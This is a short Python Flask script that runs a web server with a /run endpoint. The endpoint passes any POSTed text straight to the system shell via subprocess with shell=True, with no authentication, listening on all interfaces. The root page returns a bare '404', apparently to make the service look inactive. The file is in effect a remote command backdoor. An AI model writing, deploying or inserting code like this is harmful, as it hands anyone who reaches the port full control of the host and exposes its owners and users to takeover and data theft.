from flask import Flask, request
import subprocess

def main():
    app = Flask(__name__)

    @app.route("/")
    def root():
        return "404"

    @app.route("/run", methods=['POST'])
    def run():
        cmd = request.data.decode()
        print("\n\n", cmd, "\n\n")
        subprocess.run(cmd, shell=True)

        return ""
    
    app.run(host="0.0.0.0")

if __name__ == "__main__":
    main()